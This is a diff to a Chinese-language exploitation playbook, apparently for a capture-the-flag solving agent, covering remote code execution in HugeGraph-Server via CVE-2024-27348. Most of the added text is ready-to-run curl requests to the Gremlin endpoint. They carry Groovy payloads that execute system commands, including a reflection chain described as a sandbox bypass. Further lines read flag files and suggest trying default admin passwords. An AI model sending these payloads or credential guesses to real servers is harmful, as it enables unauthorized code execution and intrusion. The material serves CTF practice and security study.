@@ -20,14 +20,44 @@ curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
 ```
 
 ### RCE（CVE-2024-27348，HugeGraph-Server）
-HugeGraph-Server 的 Gremlin 执行点可被利用执行系统命令：
+
+CVE-2024-27348 核心：HugeGraph-Server 的 Gremlin 端点未正确沙箱，Groovy 脚本可执行任意代码（1.3.0 之前版本）。
+
+**先测未授权**：
 ```bash
-# 通过 Gremlin 调 Runtime.exec 反射链执行命令
 curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
-  -d '{"gremlin":"Thread.currentThread().getContextClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}'
-# 更多利用链见 security_search("HugeGraph CVE-2024-27348 RCE")
+  -d '{"gremlin":"1+1"}'
+# 返回 2 = 未授权可执行 Groovy
 ```
-- 若 Gremlin 需要认证，先试默认口令（admin/admin、admin/password）或从源码/配置找凭据。
+
+**RCE payload（按顺序试，命中即停）**：
+```bash
+# 1. Groovy 直接 execute（最简，老版本直接命中）
+curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
+  -d '{"gremlin":"\"id\".execute().text"}'
+
+# 2. bash -c 变体
+curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
+  -d '{"gremlin":"[\"bash\",\"-c\",\"id\"].execute().text"}'
+
+# 3. 反射链（若 1/2 被拦）
+curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
+  -d '{"gremlin":"Class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}'
+
+# 4. 反射拿 Runtime（CVE-2024-27348 沙箱绕过核心）
+curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
+  -d '{"gremlin":"def r=Class.forName(\"java.lang.Runtime\").getDeclaredMethods().find{it.name==\"getRuntime\"}.invoke(null); r.exec(\"id\").text"}'
+```
+
+**读 flag**：
+```bash
+curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
+  -d '{"gremlin":"[\"bash\",\"-c\",\"cat /flag /challenge/flag* 2>/dev/null\"].execute().text"}'
+```
+
+**关键陷阱**：
+- 返回 `Not allowed to execute command via Gremlin` 说明有沙箱，改试 payload 4（反射绕过）。
+- 需要认证时试 admin/admin、admin/password；或先未授权探测 `/apis`、`/graphs`。
 - 拿到 RCE 后 `find / -name 'flag*' 2>/dev/null`。
 
 ## Neo4j（次要）
